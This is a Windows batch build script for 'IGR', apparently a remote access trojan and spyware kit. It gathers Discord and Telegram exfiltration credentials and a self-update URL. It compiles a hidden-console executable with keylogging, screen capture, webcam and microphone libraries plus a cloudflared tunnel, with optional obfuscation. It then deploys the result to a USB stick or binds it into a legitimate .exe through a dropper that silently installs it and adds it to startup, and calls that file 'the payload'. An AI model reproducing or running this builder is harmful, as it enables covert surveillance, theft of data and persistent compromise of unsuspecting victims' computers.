@echo off
setlocal enabledelayedexpansion
REM Change to script directory so relative paths work
cd /d "%~dp0"

REM Read version from main.py
set "IGR_VERSION="
for /f %%v in ('python -c "import re;m=re.search(r'IGR_VERSION\s*=\s*[\x22\x27]([^\x22\x27]+)',open('files/main.py').read());print(m.group(1) if m else '6')"') do set "IGR_VERSION=%%v"
if not defined IGR_VERSION set "IGR_VERSION=6"
echo ============================================
echo   IGR v%IGR_VERSION% Build
echo ============================================
echo.
echo   Injection Method:
echo   [1] USB Stick   - Manual deploy via USB (classic)
echo   [2] EXE Bind    - Merge IGR into a legitimate .exe
echo.
set /p "INJECT_MODE=Choose method (1 or 2): "

echo.
echo   EXE Icon:
echo   [1] Python   - Default Python icon
echo   [2] Blank    - No icon (generic Windows exe)
echo   [3] IGR Logo - Custom IGR logo
echo.
set /p "ICON_CHOICE=Choose icon (1, 2 or 3): "
if "%ICON_CHOICE%"=="1" set "ICON_FLAG="
if "%ICON_CHOICE%"=="2" set "ICON_FLAG=--icon=files\blank.ico"
if "%ICON_CHOICE%"=="3" set "ICON_FLAG=--icon=files\logos\igr-logo.ico"
if not defined ICON_FLAG set "ICON_FLAG=--icon=files\blank.ico"

echo.
echo   Feature Set:
echo   [1] Full Version    - All features enabled (recommended)
echo   [2] Manual Select   - Choose which features to include
echo.
set /p "FEAT_MODE=Choose feature set (1 or 2): "

if "%FEAT_MODE%"=="1" (
    echo   All features enabled.
    python files\feature_select.py --full >nul 2>&1
    if exist _feat_flags.bat call _feat_flags.bat
    del /f /q _feat_flags.bat >nul 2>&1
) else (
    python files\feature_select.py
    if exist _feat_flags.bat call _feat_flags.bat
    del /f /q _feat_flags.bat >nul 2>&1
)

if "%INJECT_MODE%"=="2" goto :bind_mode

echo.
echo ============================================
echo   IGR v%IGR_VERSION% Build - USB Stick Mode
echo ============================================
echo.

REM Check if saved config exists and handle it via PowerShell
echo [1/6] Configuration
echo.
if not exist config.txt goto :usb_ask_config
echo   Found saved configuration (config.txt):
echo.
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 show
echo.
set /p "USE_SAVED=  Use saved config? (y/n): "
if /i "!USE_SAVED!"=="y" goto :usb_load_config
echo   Entering new configuration...
echo.

:usb_ask_config
set "DISCORD_WEBHOOK="
set /p "DISCORD_WEBHOOK=  Discord Webhook URL (leave blank to skip): "
set "DISCORD_USERNAME=IGR"
set /p "DISCORD_USERNAME=  Discord Bot Name [%DISCORD_USERNAME%]: "
if "%DISCORD_USERNAME%"=="" set "DISCORD_USERNAME=IGR"
set "DASHBOARD_PASSWORD="
set /p "DASHBOARD_PASSWORD=  Dashboard Password: "
set "TELEGRAM_BOT_TOKEN="
set /p "TELEGRAM_BOT_TOKEN=  Telegram Bot Token (leave blank to skip): "
set "TELEGRAM_CHAT_ID="
set /p "TELEGRAM_CHAT_ID=  Telegram Chat ID (leave blank to skip): "
set "UPDATE_URL="
set /p "UPDATE_URL=  Self-Update URL (leave blank to skip): "

REM Validate: at least 1 of Discord or Telegram must be configured
set "HAS_DISCORD=0"
set "HAS_TELEGRAM=0"
if defined DISCORD_WEBHOOK set "HAS_DISCORD=1"
if defined TELEGRAM_BOT_TOKEN if defined TELEGRAM_CHAT_ID set "HAS_TELEGRAM=1"

if "%HAS_DISCORD%"=="0" if "%HAS_TELEGRAM%"=="0" (
    echo.
    echo ERROR: At least Discord webhook or Telegram bot token + chat ID required!
    pause
    exit /b 1
)

if "%HAS_DISCORD%"=="0" echo   NOTE: Discord not configured, using Telegram only.
if "%HAS_TELEGRAM%"=="0" echo   NOTE: Telegram not configured, using Discord only.
if not defined DASHBOARD_PASSWORD echo   WARNING: DASHBOARD_PASSWORD is empty.

echo   Config ready.

REM Save config for next time (PowerShell reads env vars directly)
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 save
echo   Configuration saved to config.txt for next build.
goto :usb_config_done

:usb_load_config
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 load
call _load_config.bat
del /f /q _load_config.bat >nul 2>&1
echo   Loaded saved config.

:usb_config_done

REM Create build copy of main.py with injected values
echo.
echo [2/6] Injecting configuration (encrypted)...
copy /y "files\main.py" "main_build.py" >nul

REM Base64-encode sensitive values so they are not plaintext in the exe
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 inject

echo   Values encrypted and injected.

echo.
echo [3/6] Installing dependencies...
pip install pyinstaller flask requests opencv-python pynput pillow pyaudio cryptography 2>nul
echo   Done.

echo.
echo [4/6] Downloading cloudflared if missing...
if not exist cloudflared.exe (
    echo Downloading cloudflared...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile 'cloudflared.exe'"
    if exist cloudflared.exe (
        echo   Downloaded cloudflared.exe
    ) else (
        echo   WARNING: cloudflared download failed - will auto-download on target PC
    )
) else (
    echo   cloudflared.exe already present
)

echo.
echo [5/6] Compiling igr_v%IGR_VERSION%.exe...
set "PYARMOR_OK=0"
set "BUILD_SRC=main_build.py"
set "EXTRA_PYARMOR_FLAGS="
if "%FEAT_OBFUSCATION%"=="1" (
    echo   PyArmor obfuscation enabled - installing pyarmor...
    pip install pyarmor >nul 2>&1
    if exist obf_dist rd /s /q obf_dist >nul 2>&1
    pyarmor gen -O obf_dist main_build.py >nul 2>&1
    if exist "obf_dist\main_build.py" (
        set "PYARMOR_OK=1"
        set "BUILD_SRC=obf_dist\main_build.py"
        for /d %%d in ("obf_dist\pyarmor_runtime_*") do set "RUNTIME_PKG=%%~nxd"
        if defined RUNTIME_PKG (
            set "EXTRA_PYARMOR_FLAGS=--paths obf_dist --collect-all !RUNTIME_PKG!"
        ) else (
            set "EXTRA_PYARMOR_FLAGS=--paths obf_dist"
        )
        echo   PyArmor obfuscation applied.
    ) else (
        echo   WARNING: PyArmor obfuscation failed - building without obfuscation.
        set "BUILD_SRC=main_build.py"
    )
)
python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% %ICON_FLAG% --clean --noconfirm ^
    --hidden-import flask ^
    --hidden-import requests ^
    --hidden-import pynput.keyboard ^
    --hidden-import pynput.mouse ^
    --hidden-import cv2 ^
    --hidden-import PIL.Image ^
    --hidden-import PIL.ImageTk ^
    --hidden-import PIL.ImageGrab ^
    --hidden-import pyaudio ^
    --hidden-import cryptography ^
    --hidden-import cryptography.hazmat.primitives.ciphers.aead ^
    --hidden-import sqlite3 ^
    %EXTRA_PYARMOR_FLAGS% ^
    %BUILD_SRC%

REM Clean up build artifacts
del /f /q "main_build.py" >nul 2>&1
if exist obf_dist rd /s /q obf_dist >nul 2>&1

if not exist "dist\igr_v%IGR_VERSION%.exe" (
    echo.
    echo ERROR: Build failed - igr_v%IGR_VERSION%.exe not found in dist\
    pause
    exit /b 1
)

echo.
echo [6/6] USB Deployment...
echo.

REM Detect removable drives (USB sticks) via PowerShell
set "USB_COUNT=0"
for /f "tokens=1 delims= " %%d in ('powershell -Command "Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -ExpandProperty DeviceID" 2^>nul') do (
    set /a USB_COUNT+=1
    set "USB_!USB_COUNT!=%%d"
)

if %USB_COUNT%==0 (
    echo   No USB sticks detected.
    echo.
    echo ============================================
    echo   BUILD SUCCESSFUL
    echo ============================================
    echo   Output: dist\igr_v%IGR_VERSION%.exe
    echo.
    echo   Manually copy to USB:
    echo     USB root:       setup.bat, cleanup.bat
    echo     USB\subfiles\:   igr_v%IGR_VERSION%.exe, cloudflared.exe
    echo ============================================
    echo.
    pause
    exit /b 0
)

echo   Found %USB_COUNT% USB stick(s):
for /l %%i in (1,1,%USB_COUNT%) do (
    echo     %%i. !USB_%%i!
)
echo.

set /p "USB_CHOICE=Select USB stick number (or 0 to skip): "
if "%USB_CHOICE%"=="0" (
    echo   Skipped USB deployment.
    echo.
    echo ============================================
    echo   BUILD SUCCESSFUL
    echo ============================================
    echo   Output: dist\igr_v%IGR_VERSION%.exe
    echo ============================================
    echo.
    pause
    exit /b 0
)

set "USB_DRIVE=!USB_%USB_CHOICE%!"
if not defined USB_DRIVE (
    echo   Invalid choice.
    pause
    exit /b 1
)

echo.
echo   Selected: %USB_DRIVE%
echo.
echo   [1] Wipe USB and install IGR only
echo   [2] Add IGR alongside existing files
echo.
set /p "USB_MODE=Choose mode (1 or 2): "

if "%USB_MODE%"=="1" (
    echo.
    echo   Wiping %USB_DRIVE% ...
    rd /s /q "%USB_DRIVE%\" 2>nul
    del /q "%USB_DRIVE%\*" 2>nul
    echo   Done.
)

echo.
echo   Copying files to %USB_DRIVE% ...
if not exist "%USB_DRIVE%\subfiles" mkdir "%USB_DRIVE%\subfiles"
copy /y "dist\igr_v%IGR_VERSION%.exe" "%USB_DRIVE%\subfiles\igr_v%IGR_VERSION%.exe" >nul
copy /y "cloudflared.exe" "%USB_DRIVE%\subfiles\cloudflared.exe" >nul
copy /y "files\setup.bat" "%USB_DRIVE%\setup.bat" >nul
echo   Done.

set "CLEANUP_COPIED=0"
echo.
set /p "CLEANUP_CHOICE=Also copy cleanup.bat to USB? (y/n): "
if /i "%CLEANUP_CHOICE%"=="y" (
    copy /y "files\cleanup.bat" "%USB_DRIVE%\cleanup.bat" >nul
    echo   cleanup.bat copied to USB root.
    set "CLEANUP_COPIED=1"
) else (
    echo   Skipped cleanup.bat.
)

echo.
echo ============================================
echo   BUILD + USB DEPLOY SUCCESSFUL
echo ============================================
echo   USB: %USB_DRIVE%
echo     Root:       setup.bat
if "%CLEANUP_COPIED%"=="1" echo     Root:       cleanup.bat
echo     subfiles\:  igr_v%IGR_VERSION%.exe -^> igr.exe, cloudflared.exe
echo ============================================
echo.
pause
exit /b 0

REM exe bind mode
:bind_mode

echo.
echo ============================================
echo   IGR v%IGR_VERSION% Build - EXE Bind Mode
echo ============================================
echo.

REM Check if saved config exists and handle it via PowerShell
echo [1/7] Configuration
echo.
if not exist config.txt goto :bind_ask_config
echo   Found saved configuration (config.txt):
echo.
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 show
echo.
set /p "USE_SAVED=  Use saved config? (y/n): "
if /i "!USE_SAVED!"=="y" goto :bind_load_config
echo   Entering new configuration...
echo.

:bind_ask_config
set "DISCORD_WEBHOOK="
set /p "DISCORD_WEBHOOK=  Discord Webhook URL (leave blank to skip): "
set "DISCORD_USERNAME=IGR"
set /p "DISCORD_USERNAME=  Discord Bot Name [%DISCORD_USERNAME%]: "
if "%DISCORD_USERNAME%"=="" set "DISCORD_USERNAME=IGR"
set "DASHBOARD_PASSWORD="
set /p "DASHBOARD_PASSWORD=  Dashboard Password: "
set "TELEGRAM_BOT_TOKEN="
set /p "TELEGRAM_BOT_TOKEN=  Telegram Bot Token (leave blank to skip): "
set "TELEGRAM_CHAT_ID="
set /p "TELEGRAM_CHAT_ID=  Telegram Chat ID (leave blank to skip): "
set "UPDATE_URL="
set /p "UPDATE_URL=  Self-Update URL (leave blank to skip): "

set "HAS_DISCORD=0"
set "HAS_TELEGRAM=0"
if defined DISCORD_WEBHOOK set "HAS_DISCORD=1"
if defined TELEGRAM_BOT_TOKEN if defined TELEGRAM_CHAT_ID set "HAS_TELEGRAM=1"

if "%HAS_DISCORD%"=="0" if "%HAS_TELEGRAM%"=="0" (
    echo.
    echo ERROR: At least Discord webhook or Telegram bot token + chat ID required!
    pause
    exit /b 1
)

echo   Config ready.

REM Save config for next time (PowerShell reads env vars directly)
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 save
echo   Configuration saved to config.txt for next build.
goto :bind_config_done

:bind_load_config
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 load
call _load_config.bat
del /f /q _load_config.bat >nul 2>&1
echo   Loaded saved config.

:bind_config_done

REM Inject config into main.py
echo.
echo [2/7] Injecting configuration (encrypted)...
copy /y "files\main.py" "main_build.py" >nul

REM Base64-encode sensitive values so they are not plaintext in the exe
powershell -ExecutionPolicy Bypass -File files\save_config.ps1 inject

echo   Values encrypted and injected.

REM Install dependencies
echo.
echo [3/7] Installing dependencies...
pip install pyinstaller flask requests opencv-python pynput pillow pyaudio cryptography 2>nul
echo   Done.

REM Compile IGR exe
echo.
echo [4/7] Compiling igr_v%IGR_VERSION%.exe...
set "PYARMOR_OK=0"
set "BUILD_SRC=main_build.py"
set "EXTRA_PYARMOR_FLAGS="
if "%FEAT_OBFUSCATION%"=="1" (
    echo   PyArmor obfuscation enabled - installing pyarmor...
    pip install pyarmor >nul 2>&1
    if exist obf_dist rd /s /q obf_dist >nul 2>&1
    pyarmor gen -O obf_dist main_build.py >nul 2>&1
    if exist "obf_dist\main_build.py" (
        set "PYARMOR_OK=1"
        set "BUILD_SRC=obf_dist\main_build.py"
        for /d %%d in ("obf_dist\pyarmor_runtime_*") do set "RUNTIME_PKG=%%~nxd"
        if defined RUNTIME_PKG (
            set "EXTRA_PYARMOR_FLAGS=--paths obf_dist --collect-all !RUNTIME_PKG!"
        ) else (
            set "EXTRA_PYARMOR_FLAGS=--paths obf_dist"
        )
        echo   PyArmor obfuscation applied.
    ) else (
        echo   WARNING: PyArmor obfuscation failed - building without obfuscation.
        set "BUILD_SRC=main_build.py"
    )
)
python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% %ICON_FLAG% --clean --noconfirm ^
    --hidden-import flask ^
    --hidden-import requests ^
    --hidden-import pynput.keyboard ^
    --hidden-import pynput.mouse ^
    --hidden-import cv2 ^
    --hidden-import PIL.Image ^
    --hidden-import PIL.ImageTk ^
    --hidden-import PIL.ImageGrab ^
    --hidden-import pyaudio ^
    --hidden-import cryptography ^
    --hidden-import cryptography.hazmat.primitives.ciphers.aead ^
    --hidden-import sqlite3 ^
    %EXTRA_PYARMOR_FLAGS% ^
    %BUILD_SRC%

del /f /q "main_build.py" >nul 2>&1
if exist obf_dist rd /s /q obf_dist >nul 2>&1

if not exist "dist\igr_v%IGR_VERSION%.exe" (
    echo.
    echo ERROR: IGR build failed - igr_v%IGR_VERSION%.exe not found in dist\
    pause
    exit /b 1
)
echo   IGR exe compiled.

REM Compile stub dropper
echo.
echo [5/7] Compiling stub.exe (dropper)...
python -m PyInstaller --onefile --noconsole --name stub %ICON_FLAG% --clean --noconfirm ^
    files\stub.py

if not exist "dist\stub.exe" (
    echo.
    echo ERROR: Stub build failed - stub.exe not found in dist\
    pause
    exit /b 1
)
echo   Stub compiled.

REM Ask for target exe
echo.
echo [6/7] Select target executable...
echo   Drag and drop the legitimate .exe file into this terminal:
set /p "TARGET_EXE="
REM Remove surrounding quotes if present
set "TARGET_EXE=%TARGET_EXE:"=%"

if not exist "%TARGET_EXE%" (
    echo ERROR: File not found: %TARGET_EXE%
    pause
    exit /b 1
)

for %%f in ("%TARGET_EXE%") do set "TARGET_NAME=%%~nxf"
echo   Target: %TARGET_NAME% (%TARGET_EXE%)

REM Bind everything together
echo.
echo [7/7] Binding executables...
python files\binder.py "dist\stub.exe" "%TARGET_EXE%" "dist\igr_v%IGR_VERSION%.exe" "dist\%TARGET_NAME%"

if not exist "dist\%TARGET_NAME%" (
    echo.
    echo ERROR: Binding failed - output not found
    pause
    exit /b 1
)

echo.
echo ============================================
echo   EXE BIND BUILD SUCCESSFUL
echo ============================================
echo   Output: dist\%TARGET_NAME%
echo   Size:  ~?? bytes
echo.
echo   When opened, this exe will:
echo     1. Launch the legitimate program normally
echo     2. Silently install IGR in the background
echo     3. Add IGR to startup registry
echo.
echo   Distribute dist\%TARGET_NAME% as the payload.
echo ============================================
echo.
pause
exit /b 0
